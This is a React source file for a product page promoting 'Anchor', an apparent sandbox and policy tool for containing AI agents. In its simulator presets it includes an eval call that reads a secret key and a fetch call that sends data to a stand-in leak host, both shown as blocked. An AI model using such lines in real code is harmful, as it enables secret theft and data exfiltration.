'use client';

import React, { useState } from 'react';
import ReplayDemo from '../components/ReplayDemo';
import AnchorPlayground from '../components/AnchorPlayground';

interface Preset {
  name: string;
  policy: string;
  action: string;
  result: {
    status: 'COMPLIANT' | 'VIOLATION' | 'BLOCKED';
    message: string;
    details: string;
  };
}

const PRESETS: Preset[] = [
  {
    name: 'Dynamic Code Execution Banned',
    policy: `[POLICIES]
rule_id = "POL-001"
target = "execution"
action = "eval"
allow = false
mitigation = "halting_with_therapy"`,
    action: `// User action attempts dynamic evaluation
eval("process.env.SECRET_KEY");`,
    result: {
      status: 'BLOCKED',
      message: 'Dynamic Eval Intercepted in 1.4ms (VIOLATION: POL-001)',
      details: 'Halting execution trace inside WASM sandbox before compiler evaluation.'
    }
  },
  {
    name: 'Authorized Module Resolution',
    policy: `[POLICIES]
rule_id = "POL-002"
target = "imports"
namespaces = ["@standard/*"]
allow = true`,
    action: `// Safe standard library import
import { formatData } from '@standard/utils';`,
    result: {
      status: 'COMPLIANT',
      message: 'Resolution Successful (POL-002 Verified)',
      details: 'Import namespace matches whitelist guidelines. Module resolved.'
    }
  },
  {
    name: 'Unauthorized Network Call',
    policy: `[POLICIES]
rule_id = "POL-003"
target = "network"
allow_domains = ["internal.api"]
allow_ports = [443]`,
    action: `// Action attempts connection outside network bounds
fetch('https://external-leak-target.com/export');`,
    result: {
      status: 'BLOCKED',
      message: 'Network Relay Intercepted (VIOLATION: POL-003)',
      details: 'Target domain "external-leak-target.com" violates strict containment walls.'
    }
  }
];

export default function AnchorOverview() {
  const [selectedPreset, setSelectedPreset] = useState<number>(0);
  const [evaluated, setEvaluated] = useState<boolean>(false);
  const [activeSubTab, setActiveSubTab] = useState<'simulator' | 'demo' | 'cli'>('simulator');

  return (
    <div className="space-y-16 animate-fadeIn">
      {/* SECTION 1: CORE SUMMARY */}
      <section className="space-y-6">
        <span className="text-xs text-neutral-500 font-mono uppercase tracking-widest">// Product_Overview</span>
        <h3 className="text-2xl text-white font-semibold tracking-tight border-b border-neutral-900 pb-2">
          Verifiable Layer-1 Agent Containment
        </h3>
        <p className="text-sm text-neutral-400 font-light leading-relaxed max-w-3xl">
          Anchor provides the layer-1 security protocol for autonomous systems. Unlike post-inference firewalls that predict if a response is safe, Anchor is a compiler-integrated execution boundary. It parses the Abstract Syntax Tree (AST) of imports, calls, and network packages, halting violations inside virtualized sandboxes before compilation.
        </p>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 pt-4">
          <div className="p-6 border border-neutral-900 bg-[#070707]/10 space-y-3">
            <h4 className="text-xs font-bold text-white font-mono uppercase">// 1. AST Scanning</h4>
            <p className="text-xs text-neutral-500 font-light leading-relaxed">
              Halts dynamic code injections, token overrides, and execution loops at the syntax parsing layer prior to context compilation.
            </p>
          </div>
          <div className="p-6 border border-neutral-900 bg-[#070707]/10 space-y-3">
            <h4 className="text-xs font-bold text-white font-mono uppercase">// 2. WASM Isolation</h4>
            <p className="text-xs text-neutral-500 font-light leading-relaxed">
              Runs execution layers inside isolated virtual boundaries, imposing strict resource limits and network drift boundaries.
            </p>
          </div>
          <div className="p-6 border border-neutral-900 bg-[#070707]/10 space-y-3">
            <h4 className="text-xs font-bold text-white font-mono uppercase">// 3. Sealed History</h4>
            <p className="text-xs text-neutral-500 font-light leading-relaxed">
              Seals all execution failures inside tamper-evident Therapy Logs, providing cryptographic audit trails for compliance.
            </p>
          </div>
        </div>
      </section>

      {/* SECTION 2: INTERACTIVE FEATURES */}
      <section className="space-y-8 pt-8 border-t border-neutral-900">
        {/* Local Tab Selector */}
        <div className="flex gap-4 border-b border-neutral-900/60 pb-3 text-xs font-mono">
          <button
            onClick={() => setActiveSubTab('simulator')}
            className={`pb-1 transition-colors hover:text-white ${
              activeSubTab === 'simulator' ? 'text-indigo-400 border-b border-indigo-400' : 'text-neutral-500'
            }`}
          >
            Policy Simulator
          </button>
          <button
            onClick={() => setActiveSubTab('demo')}
            className={`pb-1 transition-colors hover:text-white ${
              activeSubTab === 'demo' ? 'text-indigo-400 border-b border-indigo-400' : 'text-neutral-500'
            }`}
          >
            Threat Isolation Replay
          </button>
          <button
            onClick={() => setActiveSubTab('cli')}
            className={`pb-1 transition-colors hover:text-white ${
              activeSubTab === 'cli' ? 'text-indigo-400 border-b border-indigo-400' : 'text-neutral-500'
            }`}
          >
            CLI Quick Start
          </button>
        </div>

        {/* SUB-TAB: PLAYGROUND */}
        {activeSubTab === 'simulator' && (
          <div className="animate-fadeIn">
            <AnchorPlayground />
          </div>
        )}

        {/* SUB-TAB: LIVE DEMO */}
        {activeSubTab === 'demo' && (
          <div className="space-y-6 animate-fadeIn">
            <div className="space-y-2">
              <span className="text-xs text-neutral-500 font-mono uppercase tracking-widest">// Forensic_Interception_Simulation</span>
              <p className="text-xs text-neutral-400 font-light">
                Watch a simulated prompt-injection and dynamic memory bypass attack get parsed, isolated, and cryptographic ledger indices sealed under the deterministic control layer.
              </p>
            </div>

            <div className="border border-neutral-950 bg-[#050505] rounded shadow-2xl p-2">
              <ReplayDemo />
            </div>
          </div>
        )}

        {/* SUB-TAB: CLI QUICKSTART */}
        {activeSubTab === 'cli' && (
          <div className="space-y-8 animate-fadeIn">
            <div className="space-y-2">
              <span className="text-xs text-neutral-500 font-mono uppercase tracking-widest">// Installation_Guide</span>
              <p className="text-xs text-neutral-400 leading-relaxed font-light">
                Secure your python-based execution runtimes using standard terminal integrations.
              </p>
            </div>

            <div className="space-y-3 font-mono">
              <span className="text-[10px] text-neutral-500 uppercase block">// CLI installation</span>
              <pre className="p-4 border border-neutral-900 bg-[#080808] text-xs text-neutral-300 rounded overflow-x-auto">
                pip install anchor-audit
              </pre>
            </div>

            <div className="space-y-4 pt-2">
              <h4 className="text-sm font-bold text-white font-mono uppercase">// Simple Code Integration</h4>
              <p className="text-xs text-neutral-400 font-light leading-relaxed">
                Wrap your agent processes or dynamic API handlers with the Anchor guard interceptor:
              </p>
              <pre className="p-4 border border-neutral-900 bg-[#080808] text-[11px] text-indigo-300/80 rounded overflow-x-auto font-mono">
{`from anchor import AnchorGuard

# Load the SHA-256 sealed constitution
guard = AnchorGuard(constitution="constitution.anchor")

# Intercept and run securely
with guard.isolate(namespace="user-workspace") as env:
    env.execute("agent_payload.py")`}
              </pre>
            </div>
          </div>
        )}
      </section>
    </div>
  );
}
